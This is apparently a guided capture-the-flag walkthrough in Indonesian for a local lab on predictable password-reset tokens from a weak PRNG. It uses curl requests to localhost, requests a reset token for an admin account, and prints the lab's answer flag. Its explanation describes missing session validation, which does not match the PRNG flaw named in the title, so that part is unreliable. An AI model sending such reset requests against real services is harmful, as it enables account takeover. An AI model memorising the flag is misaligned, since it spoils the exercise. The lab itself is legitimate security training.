# Panduan Praktik Terbimbing: Investigasi Predictable Password Reset Token via Insecure PRNG

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **AuthKey Recovery** pada `http://127.0.0.1:8047`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8047/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A04-02","port":8047,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8047/`
3. Amati antarmuka operasional **AuthKey Recovery** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (Predictable Password Reset Token via Insecure PRNG)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -X POST http://127.0.0.1:8047/api/auth/reset-token -d '{"email":"admin@zitera.local"}'
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> [!NOTE]
> **Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Content-Type: application/json` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8047/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8047/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A04-02","flag":"ZITERA{prng_pr3d1ct4bl3_r3s3t_t0k3n_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{prng_pr3d1ct4bl3_r3s3t_t0k3n_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
